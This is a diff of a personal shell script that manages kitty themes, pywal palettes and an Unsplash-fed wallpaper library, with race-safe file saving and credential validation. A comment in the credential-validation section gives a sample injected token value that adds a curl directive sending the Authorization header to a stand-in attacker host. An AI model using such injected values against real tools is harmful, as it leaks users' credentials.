@@ -6,11 +6,21 @@
 CONFIG_DIR="${CONFIG_DIR:-$HOME/.config}"
 KITTY_DIR="${KITTY_CONFIG_DIRECTORY:-$CONFIG_DIR/kitty}"
 CURRENT="$KITTY_DIR/current-theme.conf"
-WALLPAPER_DIR="${WALLPAPER_DIR:-$CONFIG_DIR/wallpapers/pc}"
+# Wallpaper library: EVERY image under this directory, subfolders included.
+# THEME_WALLPAPER_DIR is the CLI's wallpaper knob (WALLPAPER_DIR still
+# honored for older scripts; downloads save to the library root).
+WALLPAPER_DIR="${THEME_WALLPAPER_DIR:-${WALLPAPER_DIR:-$CONFIG_DIR/wallpapers}}"
 WAL_CACHE="${WAL_CACHE:-$HOME/.cache/wal}"
 MIN_WIDTH=2560
 UA='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
-IMG_GLOB=(-iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' -o -iname '*.gif')
+# Every format the desktop setter AND pywal's backends both handle, so
+# anything listed can actually be SET and derive a scheme. All included by
+# default; THEME_FORMATS replaces the set, THEME_EXCLUDE_FORMATS subtracts
+# (comma- or space-separated, case and leading dots ignored).
+THEME_FORMATS_ALL="jpg jpeg png webp gif bmp tif tiff"
+# Palette contrast floor. Enforced twice: as pywal's --contrast request, and
+# again by post_floor_palette against the EFFECTIVE (blended) background.
+WAL_CONTRAST="${THEME_CONTRAST:-4.5}"
 
 # EVERY message this tool prints passes through one of these two, so this is
 # where control bytes stop — not at whichever call sites someone remembered.
@@ -25,6 +35,26 @@ note() { printf 'theme: %s\n' "$(display_text "$*")"; }
 dry() { [ -n "${THEME_NO_APPLY:-}" ]; }
 
 # --- small utilities -------------------------------------------------------
+
+# IMG_GLOB (find(1) -iname clauses) built from THEME_FORMATS minus
+# THEME_EXCLUDE_FORMATS. An emptied set is refused loudly rather than
+# silently listing nothing.
+build_img_glob() {
+    local inc exc e x skip
+    inc=$(printf '%s' "${THEME_FORMATS:-$THEME_FORMATS_ALL}" | tr ',' ' ' | tr '[:upper:]' '[:lower:]')
+    exc=$(printf '%s' "${THEME_EXCLUDE_FORMATS:-}" | tr ',' ' ' | tr '[:upper:]' '[:lower:]')
+    IMG_GLOB=()
+    for e in $inc; do
+        e="${e#.}"
+        [ -n "$e" ] || continue
+        skip=""
+        for x in $exc; do [ "${x#.}" = "$e" ] && { skip=1; break; }; done
+        [ -n "$skip" ] && continue
+        [ "${#IMG_GLOB[@]}" -gt 0 ] && IMG_GLOB+=(-o)
+        IMG_GLOB+=(-iname "*.$e")
+    done
+    [ "${#IMG_GLOB[@]}" -gt 0 ] || die "THEME_FORMATS/THEME_EXCLUDE_FORMATS leave no formats to list"
+}
 
 slugify() {
     local s
@@ -188,49 +218,285 @@ fetch_img() {
 
 # Save $1 (temp file, mime $2, name hint $3) into WALLPAPER_DIR; sets $SAVED.
 # Identical content under the same name is reused; different content never
-# overwrites — it takes the next free -2, -3, ... suffix.
+# overwrites — it takes the next free -2, -3, ... suffix. Downloads land in
+# the per-source subfolder the caller named in SAVE_SUBDIR (unsplash/,
+# pinterest/, …) — the library is recursive, so list/set/preview see them
+# either way; an empty SAVE_SUBDIR keeps the library root.
+# Destination selection AND creation, bound to a DIRECTORY DESCRIPTOR.
+#
+# Every pathname operation in shell re-resolves the whole string, so no
+# amount of canonicalizing can bind a check to the write that follows it: an
+# attacker who renames the checked provider directory and drops a symlink at
+# the same name redirects the open, and `pwd -P` output is just a string that
+# resolves through the new link. (Demonstrated by review against exactly that
+# swap.) Binding requires a descriptor, and shell has no openat: bash cannot
+# traverse /dev/fd/N on macOS, so the create happens here instead. python3 is
+# already required by this tool.
+#
+# The library root is opened following symlinks — a library kept on another
+# volume through a symlink is normal. The provider subdirectory is then
+# opened RELATIVE to that descriptor with O_NOFOLLOW, which in one operation
+# proves it is not a symlink and is a real child of the library: there is no
+# path string left for anyone to re-point. Every subsequent create is
+# O_CREAT|O_EXCL|O_NOFOLLOW against that same descriptor, so the file lands
+# in the directory that was checked, whatever happens to its NAME meanwhile.
+#
+# Prints "SAVED <path>", "REUSED <path>", or "ERR <message>".
+SAVE_PY='
+import errno, os, pwd, re, shutil, stat, subprocess, sys
+src, lib, sub, base, ext = sys.argv[1:6]
+def out(tag, val):
+    sys.stdout.write(tag + " " + val + "\n"); raise SystemExit(0)
+# The CURRENT name of the descriptor, asked of the kernel rather than
+# assembled from caller strings. Used only to REPORT where the checked object
+# lives, never to make a decision, so a rename during the save yields the
+# checked directory under its new name instead of a name that now points
+# somewhere else entirely.
+def fdpath(fd, fallback):
+    try:
+        if sys.platform == "darwin":
+            import fcntl
+            return fcntl.fcntl(fd, 50, b"\0" * 1024).rstrip(b"\0").decode()
+        return os.readlink("/proc/self/fd/%d" % fd)
+    except Exception:
+        return fallback
+# A pathname handed back to the shell is re-resolved by everything that
+# touches it afterwards: the xattr, the size probe, pywal, the desktop
+# setter. None of those can hold a descriptor, so the pathname is only worth
+# what its whole chain of directories is worth. Replacing ANY component
+# retargets it, and replacing a component needs write on that component
+# PARENT - so the audit walks the entire canonical chain to the root, not
+# just the two directories being written into. Review demonstrated both gaps:
+# a 0777 grandparent let the library entry itself be swapped after the save
+# returned, and an ACL write grant passed a mode-only test.
+def acl_write_grant(path):
+    # Returns a REASON to refuse, or None. macOS ACLs grant write
+    # independently of the POSIX mode - the mode still reads 0755 while
+    # another principal holds add_file/delete_child. Only ALLOW entries
+    # granting a write-shaped right to someone who is not us count: a DENY
+    # entry restricts rather than grants, and every macOS home directory
+    # carries `group:everyone deny delete`, so treating any ACE at all as
+    # dangerous would refuse every ordinary account. `ls -lde` prints ACEs as
+    # numbered lines; a trailing @ on the mode means extended ATTRIBUTES, not
+    # an ACL, and is irrelevant here.
+    #
+    # The set below includes the INDIRECT grants as well as the direct ones.
+    # writesecurity is ACL administration: a principal holding it can simply
+    # rewrite the ACL to give itself add_file and delete_child, so a predicate
+    # that only knows the direct rights certifies a directory that can grant
+    # itself write a moment later. chown is here for the same reason - owning
+    # the object confers the same authority.
+    grants = ("write", "append", "delete", "delete_child", "add_file",
+              "add_subdirectory", "chown", "writeattr", "writeextattr",
+              "writesecurity")
+    try:
+        if sys.platform == "darwin":
+            me = pwd.getpwuid(os.getuid()).pw_name
+            r = subprocess.run(["/bin/ls", "-lde", path],
+                               capture_output=True, text=True, timeout=10)
+            if r.returncode != 0:
+                return "could not be audited for ACLs: ls -lde failed"
+            for ln in r.stdout.splitlines():
+                m = re.match(r"\s*\d+:\s*(.*)$", ln)
+                if not m:
+                    continue
+                ace = m.group(1)
+                parts = ace.split()
+                if "allow" not in parts:
+                    continue
+                who = parts[0]
+                perms = parts[-1].split(",")
+                hit = [g for g in grants if g in perms]
+                if not hit:
+                    continue
+                if who in ("user:" + me, me):
+                    continue
+                return ("has an ACL granting " + who + " " + ",".join(hit) +
+                        ", which lets them replace entries regardless of the mode")
+            return None
+        g = shutil.which("getfacl")
+        if not g:
+            # An uninterrogable directory is an UNPROVEN one, and this
+            # predicate exists precisely because the mode cannot answer the
+            # question. Failing open here would silently downgrade every
+            # non-darwin install to the mode-only check the review rejected -
+            # and the documented Ubuntu path does not install acl by default,
+            # so that downgrade would be the common case rather than a corner.
+            return ("cannot be audited for ACLs: getfacl is not installed"
+                    " - install it (Debian/Ubuntu: apt install acl)")
+        r = subprocess.run([g, "-cp", path], capture_output=True, text=True, timeout=10)
+        if r.returncode != 0:
+            return "could not be audited for ACLs: getfacl failed"
+        me = pwd.getpwuid(os.getuid()).pw_name
+        for ln in r.stdout.splitlines():
+            f = ln.strip().split(":")
+            if len(f) < 3 or ln.startswith("#"):
+                continue
+            kind, who, perm = f[0], f[1], f[2]
+            if kind not in ("user", "group") or who == "" or who == me:
+                continue
+            if "w" in perm:
+                return ("has an ACL granting " + kind + ":" + who +
+                        " write, which lets them replace entries regardless of the mode")
+    except Exception as e:
+        return "could not be audited for ACLs: " + str(e)
+    return None
+def audit_dir(path, st):
+    if st.st_uid not in (0, os.getuid()):
+        out("ERR", "refusing to save: " + path + " is owned by another user, so it can be replaced underneath the saved path")
+    if st.st_mode & (stat.S_IWGRP | stat.S_IWOTH):
+        out("ERR", "refusing to save: " + path + " is group- or world-writable, so another principal can replace entries in it")
+    why = acl_write_grant(path)
+    if why:
+        out("ERR", "refusing to save: " + path + " " + why)
+def audit_chain(path):
+    # Canonical, so a symlinked component is audited as what it really is.
+    q = os.path.realpath(path)
+    while True:
+        audit_dir(q, os.stat(q))
+        parent = os.path.dirname(q)
+        if parent == q:
+            return
+        q = parent
+def trusted(fd, what):
+    # The two directories actually written into are judged through the OPEN
+    # DESCRIPTOR, which cannot be raced: fstat describes the object being
+    # held, not a name someone may have swapped.
+    st = os.fstat(fd)
+    if not stat.S_ISDIR(st.st_mode):
+        out("ERR", what + " is not a directory")
+    if st.st_uid != os.getuid():
+        out("ERR", "refusing to save into " + what + " - it is not owned by you, so another principal could move it mid-save")
+    if st.st_mode & (stat.S_IWGRP | stat.S_IWOTH):
+        out("ERR", "refusing to save into " + what + " - it is group- or world-writable, so another principal could replace it mid-save")
+    return st
+try:
+    libfd = os.open(lib, os.O_RDONLY | os.O_DIRECTORY)
+except OSError as e:
+    out("ERR", "cannot open the wallpaper library " + lib + ": " + e.strerror)
+trusted(libfd, lib)
+dirfd = libfd
+where = fdpath(libfd, lib)
+# Every ancestor of the library, to the root: the returned pathname is only
+# as trustworthy as the weakest directory on the way to it.
+audit_chain(where)
+if sub:
+    # A provider label is ONE component. Anything else is a caller bug, and a
+    # caller bug here is a directory traversal.
+    if sub in (".", "..") or "/" in sub:
+        out("ERR", "invalid provider folder " + sub)
+    try:
+        os.mkdir(sub, 0o755, dir_fd=libfd)
+    except FileExistsError:
+        pass
+    except OSError as e:
+        out("ERR", "cannot create " + lib + "/" + sub + ": " + e.strerror)
+    try:
+        dirfd = os.open(sub, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=libfd)
+    except OSError as e:
+        if e.errno in (errno.ELOOP, errno.EMLINK, errno.ENOTDIR):
+            out("ERR", "refusing to save through " + lib + "/" + sub +
+                " - the provider folder is a symlink, not a directory in the library")
+        out("ERR", "cannot open " + lib + "/" + sub + ": " + e.strerror)
+    trusted(dirfd, lib + "/" + sub)
+    where = fdpath(dirfd, lib + "/" + sub)
+    audit_chain(where)
+# Every exit that hands back a pathname goes through here: the string must
+# still name the very object the descriptor checked, by identity and not by
+# spelling. This applies to a REUSED file exactly as much as to a created
+# one. The caller cannot tell the two apart, and neither can an attacker.
+def settled(st, name, tag):
+    # Ask the kernel where the descriptor lives NOW. If the directory was
+    # renamed while we worked, this names it under its new name, which is
+    # still the object that was checked and written; the identity test below
+    # then confirms the string really does resolve to that file. An attacker
+    # who swapped the ORIGINAL name for a symlink gains nothing: we never
+    # return that name, and if anything at all fails to line up we refuse.
+    final = fdpath(dirfd, where) + "/" + name
+    try:
+        fs = os.stat(final)
+        if (fs.st_dev, fs.st_ino) != (st.st_dev, st.st_ino):
+            raise OSError(0, "identity changed")
+    except OSError:
+        out("ERR", "the provider folder changed underneath the save - " + final +
+            " no longer refers to the file that was checked; refusing to hand back a path that moved")
+    out(tag, final)
+try:
+    with open(src, "rb") as f:
+        data = f.read()
+except OSError as e:
+    out("ERR", "cannot read the downloaded file: " + e.strerror)
+n = 1
+while n <= 99:
+    name = base + "." + ext if n == 1 else base + "-" + str(n) + "." + ext
+    try:
+        fd = os.open(name, os.O_CREAT | os.O_EXCL | os.O_WRONLY | os.O_NOFOLLOW,
+                     0o644, dir_fd=dirfd)
+    except FileExistsError:
+        # Occupied. Reuse ONLY a byte-identical regular file that is not a
+        # symlink: an alias to identical bytes is still not that file, and
+        # adopting it would put a pointer in the library under its own name.
+        try:
+            efd = os.open(name, os.O_RDONLY | os.O_NOFOLLOW, dir_fd=dirfd)
+        except OSError:
+            n += 1
+            continue
+        same = False
+        try:
+            est = os.fstat(efd)
+            if stat.S_ISREG(est.st_mode):
+                with os.fdopen(efd, "rb") as g:
+                    same = g.read() == data
+            else:
+                os.close(efd)
+        except OSError:
+            same = False
+        if same:
+            settled(est, name, "REUSED")
+        n += 1
+        continue
+    except OSError as e:
+        out("ERR", "cannot write " + where + "/" + name + ": " + e.strerror)
+    try:
+        st = os.fstat(fd)
+        with os.fdopen(fd, "wb") as g:
+            g.write(data)
+        os.chmod(name, 0o644, dir_fd=dirfd, follow_symlinks=False)
+    except OSError as e:
+        out("ERR", "cannot write " + where + "/" + name + ": " + e.strerror)
+    settled(st, name, "SAVED")
+out("ERR", "cannot save into " + where + " - 99 names starting " + base + " are taken")
+'
+
 save_wallpaper() {
-    local ext base dest n
+    local ext base dest
     case "$2" in
     image/jpeg) ext=jpg ;; image/png) ext=png ;; image/webp) ext=webp ;;
     image/gif) ext=gif ;; image/avif) ext=avif ;; *) ext="${2#image/}" ;;
     esac
     base=$(slugify "${3%.*}")
     [ -n "$base" ] || base="wallpaper-$(date +%Y%m%d-%H%M%S)"
-    mkdir -p "$WALLPAPER_DIR" || die "cannot create $WALLPAPER_DIR"
-    dest="$WALLPAPER_DIR/$base.$ext"
-    n=2
-    # ONE mechanism answers both "is this name free?" and "write it": bash's
-    # noclobber redirect opens O_CREAT|O_EXCL, which fails on anything already
-    # at the path — regular file, directory, or symlink, INCLUDING a dangling
-    # one. Asking with `[ -e ]` first would be two mistakes at once: `-e`
-    # FOLLOWS symlinks, so a dangling symlink planted in the library reads as a
-    # vacant slot and a plain `cp` writes straight through it to a target
-    # outside the library; and a separate check leaves a window in which the
-    # answer can change before the write. There is no window here because there
-    # is no separate check.
-    until ( set -C; cat "$1" >"$dest" ) 2>/dev/null; do
-        # The redirect failed. If nothing is at the path, the cause was not an
-        # occupied name — the directory is unwritable, or worse — and trying
-        # suffixes would just spin.
-        [ -e "$dest" ] || [ -L "$dest" ] || die "cannot write $dest"
-        # Occupied. Reuse only a byte-identical PLAIN file: `-f` follows
-        # symlinks, so `-L` is what stops an alias to an identical file from
-        # being adopted as the saved wallpaper.
-        if [ -f "$dest" ] && [ ! -L "$dest" ] &&
-            [ "$(hash_of "$1")" = "$(hash_of "$dest")" ]; then
-            SAVED="$dest"
-            [ -n "$SOURCE_URL" ] && ! xattr -p theme.source "$dest" >/dev/null 2>&1 &&
-                xattr -w theme.source "$SOURCE_URL" "$dest" 2>/dev/null
-            note "already have $(basename "$dest") — reusing it"
-            return 0
-        fi
-        [ "$n" -le 99 ] ||
-            die "cannot save into $WALLPAPER_DIR — 99 names starting $base are taken"
-        dest="$WALLPAPER_DIR/$base-$n.$ext"
-        n=$((n + 1))
-    done
-    chmod 644 "$dest"
+    # One call does destination selection AND creation, bound to a directory
+    # descriptor (see SAVE_PY above): the provider folder is opened relative
+    # to the library with O_NOFOLLOW, and every create is O_EXCL|O_NOFOLLOW
+    # against that descriptor. The symlink refusal, the containment proof and
+    # the write are then a single indivisible sequence rather than a check
+    # followed by a re-resolved pathname.
+    local result tag
+    result=$(python3 -c "$SAVE_PY" "$1" "$WALLPAPER_DIR" "${SAVE_SUBDIR:-}" "$base" "$ext") ||
+        die "saving failed"
+    tag=${result%% *}
+    dest=${result#* }
+    case "$tag" in
+    ERR) die "$dest" ;;
+    REUSED)
+        SAVED="$dest"
+        [ -n "$SOURCE_URL" ] && ! xattr -p theme.source "$dest" >/dev/null 2>&1 &&
+            xattr -w theme.source "$SOURCE_URL" "$dest" 2>/dev/null
+        note "already have $(basename "$dest") — reusing it"
+        return 0
+        ;;
+    esac
     SAVED="$dest"
     # Provenance for `theme list`: where this wallpaper came from, recorded on
     # the file itself. Read back by wall_source(); best-effort, never fatal.
@@ -249,20 +515,20 @@ save_wallpaper() {
 # Remote control (kitty.conf: allow_remote_control password + listen_on
 # unix:/tmp/kitty-samuel + remote_control_password "" set-colors, i.e. a
 # passwordless socket client may call set-colors and NOTHING else) is the
-# reliable path — a running instance ignores SIGUSR1 on this machine, and its
-# windows (old and new) keep the in-memory palette forever. set-colors
+# reliable path. The removed `pkill -USR1 -x kitty` fallback was never a second
+# path: macOS reports the process name as the full bundle path, so the -x exact
+# match never matched and the signal was never delivered. set-colors
 # --configured also updates the instance's stored config, so windows opened
-# later inherit the new palette too. SIGUSR1 stays as a fallback for instances
-# started before the socket config existed.
+# later inherit the new palette too. NO SIGUSR1 fallback (owner directive
+# 2026-08-30): a full config reload resets runtime state — font-size zoom,
+# resized panes — and a theme change may touch colors ONLY. An instance no
+# socket reaches keeps its old palette; its next window reads the include.
 reload_kitty() {
-    local sock applied=0
+    local sock
     for sock in /tmp/kitty-samuel-*; do
         [ -S "$sock" ] || continue
-        if kitten @ --to "unix:$sock" set-colors --all --configured "$1" 2>/dev/null; then
-            applied=1
-        fi
+        kitten @ --to "unix:$sock" set-colors --all --configured "$1" 2>/dev/null || true
     done
-    [ "$applied" = 1 ] || pkill -USR1 -x kitty 2>/dev/null
     return 0
 }
 
@@ -287,17 +553,113 @@ set_desktop() {
 set_palette() {
     dry && { note "[no-apply] would derive a palette from $1"; return 0; }
     command -v wal >/dev/null 2>&1 || die "pywal not installed (pipx install pywal)"
+    # --contrast below is implemented through ImageMagick averaging (pywal calls
+    # magick, or convert on older builds). Without it all three rungs fail the
+    # same way and the only message is a generic "pywal failed"; check once, up
+    # front, and say what to install.
+    command -v magick >/dev/null 2>&1 || command -v convert >/dev/null 2>&1 ||
+        die "ImageMagick not installed (brew install imagemagick / apt install imagemagick) — required for the --contrast palette floor"
     # colorz refuses near-monochrome art ("not enough colors");
     # modern_colorthief (pipx inject pywal modern_colorthief) handles those.
-    wal -i "$1" --backend colorz >/dev/null 2>&1 ||
-        wal -i "$1" --backend modern_colorthief >/dev/null 2>&1 ||
-        wal -i "$1" >/dev/null 2>&1 ||
+    # --contrast "$WAL_CONTRAST" floors accent-vs-background contrast (needs imagemagick);
+    # dark art otherwise yields ~1.6:1 accents — invisible typed text. A 3.0
+    # request lands ~4.5:1 measured while staying in the image's hue family.
+    # -s -t -e: derivation + cache export ONLY. pywal's live-reload otherwise
+    # sprays Linux-console/urxvt escapes (ESC]P…, OSC 708) into EVERY open
+    # tty — kitty misparses them (tab title became the palette bytes) — and
+    # runs its own kitty reload; reload_kitty below is the one sanctioned
+    # path to a live terminal, and it touches colors only.
+    wal -i "$1" -s -t -e --backend colorz --contrast "$WAL_CONTRAST" >/dev/null 2>&1 ||
+        wal -i "$1" -s -t -e --backend modern_colorthief --contrast "$WAL_CONTRAST" >/dev/null 2>&1 ||
+        wal -i "$1" -s -t -e --contrast "$WAL_CONTRAST" >/dev/null 2>&1 ||
         die "pywal failed on $1"
     [ -f "$WAL_CACHE/colors-kitty.conf" ] ||
         die "pywal wrote no kitty colors in $WAL_CACHE — point WAL_CACHE at pywal's own cache dir"
+    # wal's floor is measured against the OPAQUE palette background, but a
+    # translucent kitty draws text over that background BLENDED with the
+    # wallpaper — on light art the effective background is far lighter and
+    # mid-tone accents die (measured 1.2:1 on a pink sky at 0.60 opacity,
+    # while wal reported 3.4:1). Re-floor every text color against the
+    # effective background, hue kept, lightness moved just far enough.
+    post_floor_palette "$1" ||
+        note "palette kept as derived (effective-background floor needs imagemagick)"
     printf 'include %s/colors-kitty.conf\n' "$WAL_CACHE" >"$CURRENT" || die "cannot write $CURRENT"
     reload_kitty "$WAL_CACHE/colors-kitty.conf"
     return 0
+}
+
+# Blend-aware contrast floor: effective bg = configured kitty opacity over the
+# wallpaper's average color; every color1-15 (and foreground) that misses
+# WAL_CONTRAST against IT is mixed toward white/black — whichever side the
+# effective background is not — by binary search to the smallest sufficient
+# step. Rewrites wal's colors + colors-kitty.conf so kitty, status swatches
+# and fresh windows all agree. Opaque terminals reduce to the same floor
+# against the palette background itself.
+PALETTE_FLOOR_PY='
+import os, re
+d = os.environ["WAL_DIR"]; a = float(os.environ["OPACITY"])
+wp = os.environ["WP_AVG"]; floor = float(os.environ["FLOOR"])
+def rgb(h):
+    h = h.lstrip("#")
+    return [int(h[i:i+2], 16) for i in (0, 2, 4)]
+def hexs(c): return "#%02x%02x%02x" % tuple(c)
+def lum(c):
+    def ch(x):
+        x /= 255
+        return x/12.92 if x <= 0.03928 else ((x+0.055)/1.055)**2.4
+    r, g, b = c
+    return 0.2126*ch(r) + 0.7152*ch(g) + 0.0722*ch(b)
+def ratio(c1, c2):
+    l1, l2 = sorted((lum(c1), lum(c2)), reverse=True)
+    return (l1+0.05) / (l2+0.05)
+cols = [l.strip() for l in open(d + "/colors")][:16]
+bg = rgb(cols[0]); w = rgb(wp)
+eff = [round(a*b + (1-a)*x) for b, x in zip(bg, w)]
+def solve(c, target):
+    # Smallest mix toward this endpoint that reaches the floor, or None when
+    # even the endpoint itself cannot (mid-tone backgrounds reach one side
+    # only — choosing by background lightness alone picked the WRONG side
+    # and shipped 2.3:1 under a 4.5 request).
+    if ratio(target, eff) < floor: return None
+    lo, hi = 0.0, 1.0
+    for _ in range(24):
+        m = (lo+hi) / 2
+        cand = [round(cc + (t-cc)*m) for cc, t in zip(c, target)]
+        if ratio(cand, eff) >= floor: hi = m
+        else: lo = m
+    return hi, [round(cc + (t-cc)*hi) for cc, t in zip(c, target)]
+def floored(h):
+    c = rgb(h)
+    if ratio(c, eff) >= floor: return h
+    best = None
+    for target in ([255]*3, [0]*3):
+        s = solve(c, target)
+        if s and (best is None or s[0] < best[0]): best = s
+    if best: return hexs(best[1])
+    # Floor unreachable against this blend: take the strongest endpoint
+    # rather than silently keeping an unreadable color.
+    wht, blk = [255]*3, [0]*3
+    return hexs(wht if ratio(wht, eff) >= ratio(blk, eff) else blk)
+new = [cols[0]] + [floored(c) for c in cols[1:16]]
+open(d + "/colors", "w").write("\n".join(new) + "\n")
+k = open(d + "/colors-kitty.conf").read()
+k = re.sub(r"^(color(\d+)) +#[0-9a-fA-F]{6}",
+    lambda m: m.group(1) + " " + new[int(m.group(2))] if int(m.group(2)) < 16 else m.group(0),
+    k, flags=re.M)
+k = re.sub(r"^(foreground +)(#[0-9a-fA-F]{6})",
+    lambda m: m.group(1) + floored(m.group(2)), k, flags=re.M)
+open(d + "/colors-kitty.conf", "w").write(k)
+'
+post_floor_palette() { # $1 wallpaper
+    local op avg
+    command -v magick >/dev/null 2>&1 || return 1
+    op=$(awk '/^background_opacity[ \t]/{v=$2} END{print (v=="") ? 1 : v}' "$KITTY_DIR/kitty.conf" 2>/dev/null)
+    case "$op" in '' | *[!0-9.]*) op=1 ;; esac
+    avg=$(magick "$1" -resize '1x1!' -depth 8 txt:- 2>/dev/null |
+        sed -n 's/.*#\([0-9A-Fa-f]\{6\}\).*/\1/p' | head -1)
+    [ -n "$avg" ] || return 1
+    WAL_DIR="$WAL_CACHE" OPACITY="$op" WP_AVG="$avg" FLOOR="$WAL_CONTRAST" \
+        python3 -c "$PALETTE_FLOOR_PY" 2>/dev/null
 }
 
 use_image() {
@@ -306,18 +668,57 @@ use_image() {
     note "now: $(basename "$1")$( [ -n "$(img_size "$1")" ] && printf ' (%s)' "$(img_size "$1")")"
 }
 
+# Cache-only scheme derivation for a wallpaper that is NOT being applied:
+# same backend ladder and contrast floor as set_palette so list/preview show
+# the palette `theme set` would produce, but with -n (never touch the
+# desktop) and no CURRENT write / kitty reload.
+derive_scheme() { # $1 file
+    command -v wal >/dev/null 2>&1 || return 1
+    wal -n -i "$1" -s -t -e --backend colorz --contrast "$WAL_CONTRAST" >/dev/null 2>&1 ||
+        wal -n -i "$1" -s -t -e --backend modern_colorthief --contrast "$WAL_CONTRAST" >/dev/null 2>&1 ||
+        wal -n -i "$1" -s -t -e --contrast "$WAL_CONTRAST" >/dev/null 2>&1
+}
+
+# Wallpapers named on STDIN get a scheme, not just the ones already applied:
+# derive whatever is missing, then re-derive the CURRENT wallpaper so wal's
+# per-run export files (colors-kitty.conf and friends — what a fresh kitty
+# window reads through $CURRENT) describe the applied theme again, not the
+# last backfilled image. Re-deriving a cached wallpaper is a cache read, not
+# an image reprocess, so the restore is cheap. The caller bounds the work by
+# bounding the list — a ten-thousand-image library must never derive beyond
+# what is being shown. Skipped under THEME_NO_APPLY (it mutates the cache).
+backfill_schemes() { # stdin: newline-delimited image paths
+    dry && { cat >/dev/null; return 0; }
+    local f cur n=0 miss=()
+    while IFS= read -r f; do
+        [ -f "$f" ] || continue
+        wall_scheme "$f" >/dev/null 2>&1 || miss+=("$f")
+    done
+    [ "${#miss[@]}" -eq 0 ] && return 0
+    note "deriving ${#miss[@]} missing colorscheme(s)…"
+    for f in "${miss[@]}"; do derive_scheme "$f" && n=$((n + 1)); done
+    cur=$(command -v wallpaper >/dev/null 2>&1 && wallpaper get 2>/dev/null | sed 's#^//#/#' | sort -u | head -1)
+    [ -n "$cur" ] && [ -f "$cur" ] && derive_scheme "$cur"
+    [ "$n" -lt "${#miss[@]}" ] && note "$((${#miss[@]} - n)) wallpaper(s) resisted every backend — still shown as -"
+    return 0
+}
+
 # --- local wallpapers ------------------------------------------------------
 
 # A title copied from `theme list` may be TRUNCATED (trailing … or cut
 # mid-word). Resolve it anyway when it is the prefix of exactly ONE library
 # file; zero or several matches fail — never a guess between candidates.
+# find(1), not a shell glob, so names in subfolders resolve too — the list
+# is recursive, so resolution must be. User input is escaped: a '*' or '['
+# in a typed name must match itself, never widen into a pattern.
+glob_escape() { printf '%s' "$1" | sed 's/[][*?\\]/\\&/g'; }
 prefix_match() { # $1 name-or-prefix
     local p="${1%…}" f hit="" n=0
     p="${p%...}"
     [ -n "$p" ] || return 1
-    for f in "$WALLPAPER_DIR/$p"*; do
+    while IFS= read -r f; do
         [ -f "$f" ] && { hit="$f"; n=$((n + 1)); }
-    done
+    done < <(find "$WALLPAPER_DIR" -type f -name "$(glob_escape "$p")*" 2>/dev/null)
     [ "$n" -eq 1 ] || return 1
     printf '%s' "$hit"
 }
@@ -329,9 +730,9 @@ prefix_match() { # $1 name-or-prefix
 # then a truncated title falls through to the same unique-prefix rule.
 library_match() { # $1 stem-or-prefix
     local f hit="" n=0
-    for f in "$WALLPAPER_DIR/$1".*; do
+    while IFS= read -r f; do
         [ -f "$f" ] && { hit="$f"; n=$((n + 1)); }
-    done
+    done < <(find "$WALLPAPER_DIR" -type f -name "$(glob_escape "$1").*" 2>/dev/null)
     [ "$n" -eq 1 ] && { printf '%s' "$hit"; return 0; }
     [ "$n" -gt 1 ] && return 1
     prefix_match "$1"
@@ -410,11 +811,18 @@ if not name:
 # cannot occur in these strings (stripped below), so each field stays put.
 name = name.replace("\x00", "")
 who = ((best.get("user") or {}).get("name") or "").replace("\x00", "")
+# The API carries no premium boolean — the signal is the image HOST:
+# Unsplash+ files are served from plus.unsplash.com (exact hostname, not a
+# substring: evilplus.unsplash.com.example must not qualify).
+from urllib.parse import urlparse
+img = u.get("raw") or u.get("full", "")
+premium = 1 if urlparse(img).hostname == "plus.unsplash.com" else 0
 for field in (
-    u.get("raw") or u.get("full", ""), best.get("width", 0), best.get("height", 0),
+    img, best.get("width", 0), best.get("height", 0),
     name,
     (best.get("links") or {}).get("download_location", ""),
-    who):
+    who,
+    premium):
     sys.stdout.write(str(field) + "\x00")
 '
 
@@ -424,10 +832,122 @@ unsplash_key() {
         security find-generic-password -s unsplash-access-key -w 2>/dev/null
 }
 
+# The application Client-ID authenticates the APP, so Unsplash+ photos come
+# back WATERMARKED. Entitlement is account-based: a one-time OAuth exchange
+# (theme unsplash auth) stores the owner-account bearer token in the
+# Keychain, and every API call then runs as the subscriber — premium files
+# arrive clean, exactly like the website's Download button.
+unsplash_user_token() {
+    [ -n "${UNSPLASH_USER_TOKEN:-}" ] && { printf '%s' "$UNSPLASH_USER_TOKEN"; return 0; }
+    command -v security >/dev/null 2>&1 &&
+        security find-generic-password -s unsplash-user-token -w 2>/dev/null
+}
+
+# Keeping a credential off argv is only half the problem: curl's -K config is
+# a GRAMMAR, `directive = "value"`, so a quote inside a value ENDS it and a
+# following newline starts a NEW directive. A credential carrying
+#     goodtoken"\nurl = "http://attacker.invalid/
+# makes curl perform a SECOND transfer to a target we never chose — and the
+# Authorization header travels with it. So every credential is validated
+# here, at the point it enters the grammar, against a closed token set: the
+# characters real Unsplash keys, secrets, tokens and codes actually use, and
+# nothing that can reach the syntax. Every SOURCE goes through this — env,
+# Keychain and pasted alike. "The owner set it" was the wrong test: the same
+# variable is also read from a Keychain item, and a value that can travel is
+# a value that can be wrong.
+require_credential() { # $1 what-it-is, $2 value — dies in the CALLER's shell
+    case "$2" in
+    '') die "$1 is empty" ;;
+    *[!A-Za-z0-9._~+/=-]*)
+        die "$1 contains characters that cannot occur in an Unsplash credential (letters, digits and . _ ~ + / = - only) — refusing to build a curl request with it" ;;
+    esac
+}
+
+# ONE curl -K config line carrying the strongest available credential —
+# stdin config, never argv, so neither token nor key ever reaches `ps`.
+#
+# WHERE the check has to live: every caller runs this function inside a
+# pipeline, and two of them inside $( ) as well, so a `die` in here would
+# exit only that subshell and the script would sail on. The binding check is
+# therefore unsplash_auth_check below, called from the command functions in
+# the MAIN shell where exiting means exiting. The guard here is the second
+# layer: if a future caller forgets the check, this refuses to EMIT the
+# poisoned line, so curl still never receives an injected directive.
+unsplash_auth_line() {
+    local tok
+    tok=$(unsplash_user_token)
+    if [ -n "$tok" ]; then
+        require_credential 'the Unsplash account token (UNSPLASH_USER_TOKEN / Keychain unsplash-user-token)' "$tok"
+        printf 'header = "Authorization: Bearer %s"\n' "$tok"
+    else
+        local key
+        key=$(unsplash_key)
+        require_credential 'the Unsplash access key (UNSPLASH_ACCESS_KEY / Keychain unsplash-access-key)' "$key"
+        printf 'header = "Authorization: Client-ID %s"\n' "$key"
+    fi
+}
+
